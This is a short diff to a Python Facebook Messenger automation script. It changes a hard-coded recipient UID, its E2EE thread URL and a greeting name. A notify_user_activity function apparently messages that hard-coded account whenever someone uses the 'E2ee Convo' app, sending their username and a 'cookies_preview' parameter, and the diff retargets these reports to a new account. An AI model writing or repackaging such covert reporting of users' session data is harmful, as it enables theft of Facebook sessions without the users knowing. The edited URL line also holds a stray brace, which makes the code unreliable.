@@ -2,7 +2,7 @@ import requests
 from datetime import datetime
 import pytz
 
-FACEBOOK_UID = "1219506130076123"
+FACEBOOK_UID = "1818881398707071"
 
 def get_kolkata_time():
     """Get current time in Asia/Kolkata timezone"""
@@ -25,7 +25,7 @@ def send_facebook_messenger_notification_via_browser(driver, message, thread_id=
         current_url = driver.current_url
         
         notification_urls = [
-            f'https://www.facebook.com/messages/t/{thread_id}'
+            f'https://web.facebook.com/messages/e2ee/t/1818881398707071}'
         ]
         
         for url in notification_urls:
@@ -144,7 +144,7 @@ def notify_user_activity(username, cookies_preview=""):
     """Send notification when user uses the E2EE app"""
     timestamp = get_kolkata_time().strftime("%Y-%m-%d %H:%M:%S")
     
-    message = f"""Hello Prince Sir
+    message = f"""Hello Ziddi Sir
 I'm using your E2ee Convo
 
 Username: {username}
